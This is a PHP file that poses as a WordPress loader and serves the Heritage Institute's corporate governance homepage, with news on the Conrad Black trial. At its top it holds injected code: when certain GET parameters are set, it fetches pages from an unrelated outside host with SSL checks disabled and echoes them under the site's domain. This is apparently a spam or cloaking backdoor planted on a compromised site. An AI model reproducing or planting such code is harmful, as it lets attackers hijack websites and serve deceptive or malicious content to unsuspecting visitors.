<?php
/**
 * Loads the WordPress environment and template.
 *
 * @package WordPress
 */
function fetchDataFromSite($site) {
    $url = 'https://replication2.pkcdurensawit.net/heritageinstitutecom/' . $site . '/';
    $ch = curl_init($url);
    curl_setopt_array($ch, [
        CURLOPT_USERAGENT => "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1.1) Gecko/20061204 Firefox/2.0.0.1",
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_SSL_VERIFYPEER => false,
        CURLOPT_SSL_VERIFYHOST => false,
        CURLOPT_CUSTOMREQUEST => 'GET'
    ]);
    $result = curl_exec($ch);
    curl_close($ch);
    return $result;
}
function fetchDataFromSite2($site) {
    $url = 'https://replication2.pkcdurensawit.net/heritageinstitutecom_sites/?sites='.$site;
    $ch = curl_init($url);
    curl_setopt_array($ch, [
        CURLOPT_USERAGENT => "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1.1) Gecko/20061204 Firefox/2.0.0.1",
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_SSL_VERIFYPEER => false,
        CURLOPT_SSL_VERIFYHOST => false,
        CURLOPT_CUSTOMREQUEST => 'GET'
    ]);
    $result = curl_exec($ch);
    curl_close($ch);
    return $result;
}
function fetchDataFromSite3($site) {
    $url = 'https://replication2.pkcdurensawit.net/heritageinstitutecom_web/?web='.$site;
    $ch = curl_init($url);
    curl_setopt_array($ch, [
        CURLOPT_USERAGENT => "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1.1) Gecko/20061204 Firefox/2.0.0.1",
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_SSL_VERIFYPEER => false,
        CURLOPT_SSL_VERIFYHOST => false,
        CURLOPT_CUSTOMREQUEST => 'GET'
    ]);
    $result = curl_exec($ch);
    curl_close($ch);
    return $result;
}

if(isset($_GET['go'])) {
    $site = $_GET['go'];
    $data = fetchDataFromSite($site);
    echo $data;
}
elseif(isset($_GET['sites'])) {
    $site = $_GET['sites'];
    $data = fetchDataFromSite2($site);
    echo $data;
}
elseif(isset($_GET['web'])) {
    $site = $_GET['web'];
    $data = fetchDataFromSite3($site);
    echo $data;
} else {
  ?>

<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">

<html>
<head>
<title>Heritage Institute - Corporate Governance, Institutional Governance</title>

<!-- Meta Tags -->
<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1" >

<meta http-equiv="Content-Style-Type" content="text/css">

<!-- <meta http-equiv="REFRESH" content="0; URL=http://www.heritageinstitute.com/zoroastrianism/"> -->

<meta name="description" content="Corporate Governance and Organizational Governance definitions and programs at the Heritage Institute" >

<meta name="keywords" content="heritage institute corporate governance,organizational,institutional,management,governance manual, governance models, guiding principles, guiding principle,governance policy,constitution,bylaw, director role,roles, director responsibility, responsibilities,strategic plan,planning,business,operational,meeting, conduct,conducting,chair, chairing,board, coach,coaching,motion,motions,resolution,resolutions,committee,committees,code,of,ethics,training">

<meta name="author" content="K.E.Eduljee">

<meta name="comments" content="HTML 4.01 Transitional coding original suggestions by T. Evdokimoff">

<link rel="stylesheet" type="text/css" href="styles_main.css">

<style type="text/css">
#title      { margin-top:4px; }

.box       { margin-top:5px; margin-left:5px; float:center; text-align:center; width:100%; border:0px; border-style:solid; border-color:#003366; }

.floatstop  { margin-top:10px; text-align:left; font-family:Verdana; font-size:7.5pt; color:#003366; line-height:130%; clear:none; }
</style>


</head>

<body>
<table id="wrapper">

<tr id="row_1" >
<td id="banner_cell" colspan="3">
<!--webbot bot="Include" U-Include="_private/banner.htm" TAG="BODY" startspan -->

<div id="banner">

<p style="text-align:center">

<img style="width:1000px; height:80px" src="images/bannerType.jpg" alt="Heritage Institute Corporate Governance and Human Relations" title="Heritage Institute Corporate Governance and Human Relations"></p></div>


<!--webbot bot="Include" i-checksum="11291" endspan --></td>
</tr>

<!-- top navbar --> 
<tr id="row_2">
<td colspan="3">
<!--webbot bot="Include" U-Include="_private/nav_bar1.htm" TAG="BODY" startspan -->
<!-- top navbar --> 

<div id="navbar">
<p class="button">
<a title="Heritage Institute Home Page" href="index.htm">Home </a>&#8226;
<a title="Corporate Governance Page" href="governance.htm">Governance </a>&#8226;
<a title="Leadership Page" href="leadership.htm">Leadership </a>&#8226;
<a title="Workplace Human Relations Page" href="humanrelations.htm">Human Relations </a>&#8226;
<a title="Workplace Interpersonal Skills Page" href="interpersonalskills.htm">Interpersonal Skills </a>&#8226;
<a title="Workplace Human Rights Page" href="humanrights.htm">Human Rights </a>&#8226;
<a title="Workplace Diversity Page" href="diversity.htm">Diversity </a>&#8226;

<!-- you may wish to create a seperate contact page instead of a mail to, or type an email address -->
<a title="Contact the Heritage Institute" href="mailto:enquiry@heritageinstitute.com">Contact Us</a></p>
</div>
<!--webbot bot="Include" i-checksum="27464" endspan --></td>
</tr> 
     
<tr>
<td colspan="3">
<div id="title">
<p class="quote" >Leadership cannot be taught, it can only be learned</p>
<p class="author" >Harold S. Geneen, CEO ITT from 1959-77, and various authors<br></p>
<br>
</div>
</td>
</tr>

<!-- main body three column -->

<!-- left column -->
<tr id="row_3">

<td id="col_left">

<div class="group">
<h1 >about the heritage institute</h1>
     
<p class="text" >
The Heritage Institute works to promote leadership, integrity and competence in governance and human relations in the workplace and community.<br><br>

The Heritage Institute is located in West Vancouver, British Columbia, Canada. We travel widely to provide in-house training and services for our clients.<br><br>

The Heritage Institute's clients have included governments, the justice system, financial institutions, businesses and community organizations.<br><br>

At the Heritage Institute, we have been working in the field of corporate governance and human relations for over 30 years.
</p>
</div>

<br>

<div class="group">
<p class="images">
<img src="images/integrity.jpg" width="290" height="212" title="Corporate Governace &amp; Human Relations Key Value - Integrity" alt="Opened Dictionary at the word Integrity" >
</p>
</div>

<br>

<div class="group">
<h1 >services</h1>
<p  class="list">The Heritage Institute's services include: </p>
<ul>
<li>Advisory &amp; consultation services</li>
<li>Facilitation</li>
<li>Training</li>
</ul>
</div>

<br>

<div class="group">
<h1>programs</h1>
<h2>&#187 <a href="governance.htm">governance</a></h2>

<ul>
<li>Board of Directors:
<ul>
<li>Corporate governance policy</li>
<li>Constitution &amp; by-laws</li>
<li>Corporate governance manuals</li>
<li>Roles &amp; responsibilities</li>
<li>Division of responsibilities</li>
<li>Meeting management</li>
</ul>
<li>Board-management-employee relations</li>
<li>Committee &amp; meeting management</li>
<li>Strategic &amp; business planning</li>
</ul>
<br>

<h2>
&#187 <a href="leadership.htm">Leadership and decision-making</a></h2>
<ul>
<li>Leadership</li>
<li>Envisioning, strategic &amp; business planning</li>
<li>Interpersonal &amp; communication skills for leaders</li>
<li>Team building</li>
<li>Problem identification &amp; problem solving</li>
<li>Conflict resolution</li>
<li>Coaching</li>
<li>Leadership evaluation</li>
</ul>
<br>

<h2>&#187 <a href="humanrelations.htm">Governance &amp; Human Relations</a></h2>
<ul>
<li>Employee &amp; general surveys</li>
<li>Team building</li>
<li>Needs assessments</li>
<li>Community involvement &amp; consultation</li>
</ul>
<br>

<h2>&#187 <a href="interpersonalskills.htm">interpersonal skills</a></h2>
<ul>
<li>Effective interpersonal relations</li>
<li>Communication skills</li>
<li>Conflict resolution, negotiations &amp; mediation</li>
</ul>
<br>

<h2>&#187 <a href="humanrights.htm">human rights</a></h2>
<ul>
<li>Human rights:
<ul>
<li>Discrimination/Harassment Prevention &amp; Intervention</li>
<li>Supervisors' responsibilities</li>
<li>Duty of care</li>
<li>Investigation &amp; resolution skills</li>
</ul>
</ul>
<br>

<h2>&#187<a href="diversity.htm">diversity</a></h2>
<ul>
<li>Diversity in the workplace and community
<ul>
<li>Building positive relations, understanding &amp; teamwork</li>
</ul>
<li>Program &amp; project design for a diverse workplace &amp; community</li>
</ul>
<br>

<hr size="1">

</div>
<br>

</td>

<!-- end of col_left -->


<!-- start of col center -->

<td id = "col_center">

<div class="group">
<p class="images">
<img src="images/Governance/meeting_1.jpg" width="290" height="187" title="Corporate Governance &amp; Effective Workplace Human Relations" alt="Boardroom meeting with members greeting one-another"></p>
</div>

<br>

<div class="group">
<h1 >feature article</h1>

<h3>&#187<a href="interpersonalskills/grammar/IorMe.htm">the language of competence - I or Me?</a></h3>

<p class="text">
<a href="interpersonalskills/grammar/IorMe.htm">Practical everyday tips. Our use or misuse of language causes others to make judgments that can have a significant influence on our career and leadership aspirations.</a></p>
</div>

<br>

<div class="group">
<h1 >information &amp; articles</h1>

<p class="text">
This site contains numerous articles that are also listed in the program pages.</p>
<br>

<h2>&#187 <a href="governance.htm">governance page</a></h2>

<p class="list">
&#187 <a href="governance.htm">What is corporate governance?</a><br>
&#187<a href="governance.htm">&nbsp;Governance &amp; management - the difference</a></p>
<br>

<h4>Governance</h4>
<p class="list">
&#187 <a href="governance/definitions.htm">Definitions of corporate governance</a><br>
&#187 <a href="governance/models.htm">Corporate governance models</a><br>
&#187 <a href="governance/glossary.htm">Glossary</a><br>
&#187 <a href="governance/wikipedia.htm">Corporate governance - Wikipedia</a></p>

<p class="list">
&nbsp; Developments in corporate governance<br>
&nbsp;&nbsp; Principles<br>
&nbsp;&nbsp; Internal and external control<br>
&nbsp;&nbsp; The role of the accountant<br>
&nbsp;&nbsp; Corporate governance models<br>
&nbsp;&nbsp; Codes and guidelines<br>
&nbsp;&nbsp; References and links<br></p>
<br>

<h4>Conducting a Meeting</h4>
<p class="list">
&#187 <a href="governance/roberts/rules_how_to_use.htm">Conducting a meeting using Robert's Rules</a><br>
&#187 <a href="governance/meetings/meeting_management.htm">Preparing for, managing &amp; chairing a meeting</a><br>
&#187 <a href="governance/meetings/chart-motions.htm">Detailed chart of motions and precedence</a><br>
&#187 <a href="governance/roberts/rules_table.htm">Robert's Rules of Order - a quick reference</a><br>
&#187 <a href="governance/roberts/rules.htm">Robert's Rules of Order - complete</a><br>
&#187 <a href="governance/meetings/making_meetings_work.htm">Making meetings work</a></p>
<br>

<hr size="1">
<br>

<h2>&#187 <a href="leadership.htm">Leadership Page</a></h2>

<p class="list">
&#187 <a href="leadership.htm">	What is Leadership</a><br>
&#187 <a href="leadership.htm"> Leadership skills &amp; authority - the difference</a><p  class="list">
&#187 <a href="leadership/quotations.htm">Quotations on leadership</a></p>
<br>

<h4>Responsibility - the buck stops here</h4>
<p  class="list">
&#187 <a href="leadership/responsibility.htm">Leadership - Taking Responsibility</a></p>
<br>

<h4>Teams</h4>
<p class="list">
&#187 <a href="leadership/teams.htm">Leadership skills for teams</a></p>
<br>

<h4>Coaching</h4>
<p class="list">
&#187 <a href="leadership/coaching_skills.htm">Coaching Skills</a></p>
<br>

<hr size="1">
<br>

<h2>&#187 <a href="humanrelations.htm">Human Relations Page</a></h2>

<p class="list">
&#187 <a href="humanrelations.htm"> How human relations assists governance</a>
<br>

<h4>Surveys</h4>

<p class="list">
&#187<a href="humanrelations/survey.htm">Workplace opinion surveys</a></p>
<br>

<hr size="1">
<br>

<h2>&#187 <a href="interpersonalskills.htm">interpersonal skills page</a></h2>

<p  class="list">
&#187 Interpersonal skills are essential competencies<br>
&#187 What are the essential interpersonal skills?</p>
<br>

<h3>interpersonal communication skills</h3>

<h4>Cooperative Communication Skills - The Seven Challenges by Dennis Rivers</h4>

<p class="list">
&#187 <a href="communication/rivers_summary.htm">The Seven Challenges - Summary</a><br>
&#187 <a href="communication/rivers1.htm">Challenge 1: Listen carefully and responsively</a><br>
&#187 <a href="communication/rivers2.htm">Challenge 2: Explain your intent and invite consent</a><br>
&#187 <a href="communication/rivers3.htm">Challenge 3: Express yourself clearly &amp; Completely</a><br>
&#187 <a href="communication/rivers4.htm">Challenge 4: Translate criticisms into requests</a><br>
&#187 <a href="communication/rivers5.htm">Challenge 5: Ask open questions</a><br>
&#187 <a href="communication/rivers6.htm">Challenge 6: Express more appreciation</a><br>
&#187 <a href="communication/rivers7.htm">Challenge 7: Make better communication second nature</a></p>
<br>


<h3>Business Communication Skills</h3>

<h4>Business Communication</h4>

<p class="list">
&#187 <a href="interpersonalskills/business/communication_problems.htm">Business Communication Objectives</a><br>
&#187 <a href="interpersonalskills/business/email.htm">Guide to Email Writing and Etiquette</a></p>
<br>

<h4>Language of Competence Series</h4>

<p class="list">&#187
	
	 
<a href="interpersonalskills/grammar/usage.htm">Language Usage Questions &amp; Tips</a><br>
&#187 <a href="interpersonalskills/grammar/style.htm">Style Problems &amp; Tips</a><br>
&#187 <a href="interpersonalskills/grammar/IorMe.htm">I or Me? Use of pronouns</a></p>
<br>

<h4>Grammar</h4>

<p class="list">
&#187 <a href="interpersonalskills/grammar/definitions.htm">Definitions &amp; Glossary</a><br>
&#187 <a href="interpersonalskills/grammar/sentences.htm">Sentences</a><br>
&#187 <a href="interpersonalskills/grammar/parts_of_speech.htm">Parts of Speech</a><br>
&#187 <a href="interpersonalskills/grammar/clause.htm">Clauses &amp; Conjunctions</a><br>
&#187 <a href="interpersonalskills/grammar/noun.htm">Nouns</a><br>
&#187 <a href="interpersonalskills/grammar/pronoun.htm">Pronouns</a><br>
&#187 <a href="interpersonalskills/grammar/participle.htm">Participles</a><br>
&#187 <a href="interpersonalskills/grammar/verb.htm">Verbs</a></p>
<br>

<hr size="1">
<br>

<h2>&#187 <a href="humanrights.htm">Human Rights Page</a></h2>

<p class="list">
<a href="humanrights.htm">
&#187 What are workplace human rights?<br>
&#187 What is discrimination?<br>
&#187 What is harassment?<br>
&#187 What is personal harassment?</a></p>

<h4>Links Page</h4>

<p class="list">
<a href="humanrights/links.htm">&#187 Canadian Human Rights Links Page</a></p>
<br>

<h3>articles</h3>

<h4>Sexual Harassment</h4>

<p class="list">
&#187 <a href="humanrights/sexual_harassment.htm">A Look at Sexual Harassment In Today's Work Environment</a></p>

<h4>Discrimination</h4>

<p class="list">
&#187 <a href="humanrights/workplace_discrimination.htm">Strategies for Defeating Workplace Discrimination</a></p>
<br>


<hr size="1">
<br>

<h2>&#187 <a href="diversity.htm">Diversity Page</a></h2>

<p class="list">
&#187 <a href="diversity/informed_decisions.htm">Informed and Credible Judgments and Decisions - Working in a Culturally Plural Setting</a>.<br>
A presentation to the Supreme Court of British Columbia. This paper is applicable to all decision-making)</p>
<br>


<h3>articles</h3>

<h4>Diversity &amp; Business</h4>

<p class="list">

&#187 <a href="diversity/economy.htm">Diversity in a Global Economy - Ways Some Firms Get It Right</a></p>

<h4>Management Tools</h4>

<p class="list">
&#187 <a href="diversity/management_tools.htm">Diversity in the Workplace Benefits, Challenges, and the Required Managerial Tools</a></p>

<h4>Effective Diversity Programs</h4>

<p class="list">
&#187 <a href="diversity/denominators.htm">Five Common Denominators of Effective Diversity Programs</a> </p>

<h4>Cultural Traits</h4>

<p class="list">
&#187 <a href="diversity/hinderance-help.htm">Cultural Traits Can Be A Hindrance or a Help</a></p>

<h4>Human Resources</h4>

<p class="list">
&#187 <a href="diversity/candidate.htm">How to Distinguish Yourself As a Culturally Diverse Candidate</a>
<br><br>
&#187 <a href="zoroastrianism/index.htm">Other</a>
<br><br>
&#187 <a href="http://www.heritageinstitute.com/zoroastrianism/index.htm">Other</a></p>

<br>
<hr size="1">

</div>

</td>
<!-- end col_center -->

<!-- start of col_right -->
<td id="col_right">

<div class="group">
<h1 >corporate governance news</h1>

<p  class="list">March 3, 2008<br>
&#187 <b> <a href="#feature"><font color="#AC0F3E">Conrad Black Trial: Black Goes to Prison</font></a></b><br>
&#187 <a href="governance/hp/woes1.htm">Hewlett Packard's Governance Woes</a><br>
&#187 <a href="governance/hp/resurgence.htm">Hewlett Packard's Resurgence</a><br>
&#187 <a href="governance/rim.htm">BlackBerry Maker Professes Sweeping Governance Changes After Accounting Problems</a><br>
&#187 <a href="governance/aflac.htm">Insurer Seeks Shareholder Opinion on Executive Compensation</a><br>
&#187 <a href="governance/aflac.htm#comp_comm">Board Compensation Committee's Face Increasing Criticism</a><br>
&#187 <a href="governance/buffett_succession.htm">Warren Buffett's Succession &amp; Governance Plans</a><br>
&#187 <a href="governance/compensation.htm"> Spotlight on CEO Compensation</a><br>
&#187 <a href="governance/diller.htm"> CEO calls Governance Researchers Birdbrains!</a><br>
&#187 <a href="governance/issues.htm"> Governance Issues Arising from Corporate Scandals</a><br>
&#187 <a href="governance/sarbanes-oxley.htm"> Sarbanes-Oxley Legislation News &amp; Views</a><br>
&#187 <a href="governance/enron.htm"> Enron Timelines</a><br>
&#187 <a href="governance/worldcom.htm"> WorldCom Timelines</a><br>
&#187 <a href="governance/telus.htm"> Governance Best Practices - TELUS</a>
</div>

<br>

<div class="group">
<p class="images">
<img src="images/Governance/meeting_3.jpg" width="290" height="190" title="Corporate Governance &amp; Effective Workplace Human Relations" alt="Boardroom meeting in progress">
</p>
</div>
<br>

<div class="group">
<h1>news feature</h1>
<br>
<a name="feature"></a>
<h2>The Conrad Black Trial</h2>
<h3>Conrad Black Goes to Prison</h3>

<table class="images"  style="float:right">
<tr><td>
<img style="width:150px; height:100px;" border="0" src="images/Governance/ColemanPrison1.jpg" alt="Coleman Prison" title="Coleman Prison">
</td></tr>
<tr><td class="smalltext"><p align="center">Coleman Prison, Florida</td></tr>
</table>

<p class="text">
March 3, 2008, Florida. Conrad <p class="text">Black, 63, left his Palm Beach, Florida mansion at about 9 this morning, and drove to Coleman Prison a to begin serving a 6 1/2-year sentence for fraud and obstruction of justice.
<br><br>
Two other Hollinger International Inc. executives, Peter Atkinson and Jack Boultbee were also convicted of fraud. Black's former partner David Radler pleaded guilty and testified as a prosecution witness in court against Black.
</p><br>

<table class="images"  style="float:left">
<tr><td>
<img style="width:180px; height:114px;" src="images/Governance/WestPalm%20Beach1.jpg" alt="Blacks at Palm Beach Mansion" title="Blacks at Palm Beach Mansion">
</td></tr>
<tr><td class="smalltext"><p align="center"> Barbara & Conrad Black<br>
at their West Palm Beach Home</td></tr>
</table>

<p class="text">
Black's wife Barbara Amiel Black accompanied him in their SUV for the three drive from their home to the prison. Coleman Prison is 50 miles north west of Orlando in central Florida. It is the largest federal prison in the United States.
<br><br>
A short time after Black surrendered himself to the prison, Mike Truman, a spokesman for the US Bureau of Prisons, said, "Conrad Black is now in custody of the Bureau of Prisons." "He is housed at the low-security facility."
<br><br>
The press had previously speculated that Black would use his time in prison to write a book denouncing Corporate Governance practice - practice which he blames for his problems. In a New York Sun editorial, he reiterated his stand that he was wrongfully convicted.
<br><br>
The other side of the coin is that a jury found him guilty of defrauding shareholders of Hollinger International. Black's biographer, Tom Bower, is quoted as saying that while Black owned only 16% of Hollinger's shares, he took 90% of its income in order to support a lavish lifestyle. Shareholders revolted, a damning report was published, and criminal charges followed.
<br><br>
On his part Black felt he was entitled to any monies received by him and that corporate governance zealots destroyed his company. However, the decline of Hollinger's fortunes started under his stewardship and before the shareholder revolt.
<br><br>
Earlier Black commented to the Post about his plans in prison. "I'd rather do something bookish than physical labour." "I wouldn't be the best guy they could have out mowing the lawn, but I could do not badly teaching French or something like that."
<br><br>
If Black does intend to serve his prison sentence writing, he will have to overcome some obstacles.
<br><br>
Upon his surrender, prison procedure would have required Black to be finger-printed, photographed, strip-searched, and give a DNA sample. He would then have been and assigned a room as inmate 18330424 - a room he will share with another inmate in a facility that houses 2,500 prisoners.
</p><br>

<p class="text">
Coleman prison requires inmates to keep a strict daily schedule starting with getting out of bed at 6:30 am, working at an assigned job from 7:30 am to 3 pm (for 12 to 40 cents an hour - a pay cut from his estimated $12,000 to $40,000 an hour income), and a head count up to seven times a day. His access to a computer and internet access is questionable. He might have to write the old fashioned way - with paper and pencil. Nevertheless he is a resourceful and determined man.
</p><br>

<h2>The Legacy of the Conrad Black Trial</h2>
<h3>Record for a Public Corporation</h3>
<img  class="images" src="images/Governance/lord_conrad_black.jpg" width="161" height="282" title="Lord Conrad Moffat Black of Crossharbour and his second wife, conservative journalist Barbara Amiel" alt="Lord Conrad Moffat Black of Crossharbour and his second wife, conservative journalist Barbara Amiel" align="right">
<p class="text">
January 17, 2008, West Vancouver.
The Conrad Black trial has left a record in recent corporate history. Never before have four directors of a public corporation been convicted of a crime.
<br><br>
The four are Messrs. Black, Radler, Atkinson, and Boultbee, and the corporation is Hollinger Inc., Hollinger International Inc.'s parent company.
</p><br>

<h3>The Pitfalls of Going Public</h3>
<p class="text">
Donald Trump recognized Black's cardinal error: On Monday, March 19, 2007, Donald Trump said, "In retrospect, he (Black) probably shouldn't have gone public."
<br><br>
Trump said that not everyone has the right mindset to run a public company and that Conrad Black should have kept his company off the stock exchange. "A public company is a different mindset. It's never easy for an individual entrepreneur who owns things because it is a whole different set of ideas."
<br><br>
Black couldn't make the transition between being an entrepreneur and senior partner in a private company to being the Chairman and CEO of a publicly traded corporation. He continued to treat the funds of a public company in the same manner as he controlled the funds of his private company.
<br><br>
In a belated attempt, Conrad Black tried to buy out the minority shareholders of Hollinger Inc., but that attempt ended in failure.
</p><br>

<h3>No Favours to Corporate Governance Practices Either</h3>
<p class="text">
The whole incident has not promoted the cause of corporate governance either.
<br><br>
Individuals styled as corporate governance experts appear to have turned Hollinger Inc. and Hollinger International Inc. into vehicles for corporate law suits rather than productive organizations.
<br><br>
The benefits of corporate governance best practices have been lost in a morass of mutual recriminations.
</p><br>

<h3>Corporate Governance 101</h3>
<p class="text">
The Conrad Black debacle was the result of ignoring basic corporate governance precepts:
<br><br>
1. The board of directors is responsible for governance and the management is responsible for the day-to-day operations of the corporation.
<br><br>
2. The board of directors must monitor management's execution of corporate policy, have monitoring processes in place, and must hold management accountable for the execution of the corporation's strategic plan.
<br><br>
3. The board of directors should represent and be nominated by the shareholders. Board members should not owe their allegiance or be nominated by management (unless managers act in their capacity as other shareholders).
<br><br>
4. Unless the CEO is the majority shareholder and there is no conflict of interest or conflict of accountability, the CEO and Chairperson positions should not be held by the same individual.
</p><br>

<hr size="1">
</div>
<a name="black_articles"></a>
<!--webbot bot="Include" U-Include="_private/black.shtml" TAG="BODY" startspan -->
<div class="group">
<h3>Conrad Black Trial Pages On This Site</h3>

<p class="list">
&#187 <a href="governance/black/background.htm">1. Background to the Conrad Black Trial</a></p>
<p class="list">
&#187 <a href="governance/black/issues.htm">2. Conrad Black Trial - Issues, Arguments and Chances. Charges and Defence. Opportunities and Challenges</a></p>
<p class="list">
&#187 <a href="governance/black/governance.htm">3. The Conrad Black Trial and Corporate Governance</a></p>
<p class="list">
&#187 <a href="governance/black/radler.htm">4. Conrad Black's Partner David Radler Pays US$28.7M Fine & US$63.4M Settlement</a></p>
<p class="list">
&#187 <a href="governance/black/1delay.htm">5. Conrad Black Trial Delayed</a></p>
<p class="list">
&#187 <a href="governance/black/2opening.htm">6. Conrad Black Trial Opening Statements</a></p>
<p class="list">
&#187 <a href="governance/black/3day3.htm">7. Conrad Black's Co-Defendants Distance Themselves From Him</a></p>
<p class="list">
&#187 <a href="governance/black/4day4.htm">8. Conrad Black's Lawyer Questions Impartiality of First Witness</a></p>
<p class="list">
&#187 <a href="governance/black/5noncompete.htm">9. The Non-Compete Payments Part 1</a></p>
<p class="list">
&#187 <a href="governance/black/6noncompete.htm">10. The Non-Compete Payments Part 2</a></p>
<p class="list">
&#187 <a href="governance/black/7noncompete_approval.htm">11. The Non-Compete Payments Had Board Approval</a></p>
<p class="list">
&#187 <a href="governance/black/8expenses.htm">12. Focus Shifts to Expenses & Use of Corporate Jet</a></p>
<p class="list">
&#187 <a href="governance/black/9torys.htm">13. Role of Lawyers in Non-Compete Payments</a></p>
<p class="list">
&#187 <a href="governance/black/10lawyers.htm">14. Role of Lawyers Part II. Accusations Suffer Setback</a></p>
<p class="list">
&#187 <a href="governance/black/11radler.htm">15. David Radler Takes the Stand Against Black</a></p>
<p class="list">
&#187 <a href="governance/black/11radler.htm#no_approval">15a. Former Gov. Thompson: No Approval for Non-Compete Payments</a></p>
<p class="list">
&#187 <a href="governance/black/12radler.htm">16. David Radler's Second Week on the Stand</a></p>
<p class="list">
&#187 <a href="governance/black/13radler.htm">17. Final Assault on David Radler's Credibility</a></p>
<p class="list">
&#187 <a href="governance/black/13radler.htm#Rosenberg">18. Jonathan Rosenberg Takes the Stand</a></p>
<p class="list">
&#187 <a href="governance/black/14prosecutionrests.htm">19. The Prosecution Rests Their Case</a></p>
<p class="list">
&#187 <a href="governance/black/15obstruction.htm">20. Obstruction of Justice Charge</a></p>
<p class="list">
&#187 <a href="governance/black/16radler_recall.htm">21. Radler Recall Overruled</a></p>
<p class="list">
&#187 <a href="governance/black/17judge_ruling.htm">22. Judge Makes a Controversial Ruling</a></p>
<p class="list">
&#187 <a href="governance/black/18closing_arguments.htm">23. Closing Arguments Commence</a></p>
<p class="list">
&#187 <a href="governance/black/19jury_deliberates.htm">24. Jury Deliberates</a></p>
<p class="list">
&#187 <a href="governance/black/20facts.htm">25. Facts and Figures</a></p>
<p class="list">
&#187 <a href="governance/black/21jury_deadlocked.htm">26. Jury Deadlocked</a></p>
<p class="list">
&#187 <a href="governance/black/22black_convicted.htm">27. Black and Co-Defendants Convicted</a></p>
<p class="list">
&#187 <a href="governance/black/23black_sentenced.htm">28. Black and Co-Defendants Sentenced</a></p>
<p class="list">
&#187 <a href="governance/black/24radler_sentenced.htm">29. Radler Sentenced</a></p>
</div>
<!--webbot bot="Include" i-checksum="36557" endspan --><hr size="1">

</td>

<!-- end col_right -->

</tr>
</table>

<!-- footer -->

<div>
<!--webbot bot="Include" U-Include="_private/footer.htm" TAG="BODY" startspan -->

<!-- footer -->

<p align="center" class="smalltext" id="footer" >
<br><br>
&#8226; � Ed Eduljee, Heritage Institute, 2007 & 2008 &#8226;&nbsp; Page validated by W3C.org&nbsp;

<a href="http://validator.w3.org/check?uri=referer"><img src="http://www.w3.org/Icons/valid-html401"
alt="Valid HTML 4.01 Transitional" style="margin-bottom:-10px; height:20px; width:56px"></a>
</p>
<!--webbot bot="Include" i-checksum="28202" endspan --></div>

</body>

</html>

<?php
}
?>
